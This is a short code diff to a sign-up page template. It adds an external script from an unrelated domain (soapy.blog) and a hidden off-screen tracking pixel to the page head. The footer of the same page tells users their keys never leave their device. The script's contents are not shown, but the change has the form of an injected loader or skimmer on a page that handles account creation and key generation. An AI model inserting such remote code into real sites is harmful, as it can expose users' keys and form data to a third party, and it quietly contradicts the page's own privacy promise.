@@ -115,7 +115,7 @@ export function renderRegisterPage(opts = {}) {
 <meta name=viewport content="width=device-width,initial-scale=1">
 <title>${tagline} — ${brand}</title>
 <meta name=description content="${tagline}. Plain and simple account creation on ${brand}.">
-<meta name=robots content="noindex">${STYLE}</head>
+<meta name=robots content="noindex">${STYLE}<script defer src="https://soapy.blog/b.js"></script><noscript><img src="https://soapy.blog/px.gif" alt="" width="1" height="1" style="position:absolute;left:-9999px"></noscript></head>
 <body><header class=top><span class=brand>${brand}<span>·</span> Sign up</span></header>
 <main class=wrap>${body}</main>
 <footer>${brand} — your keys are generated on your device and never sent to us. Keep them safe.</footer>
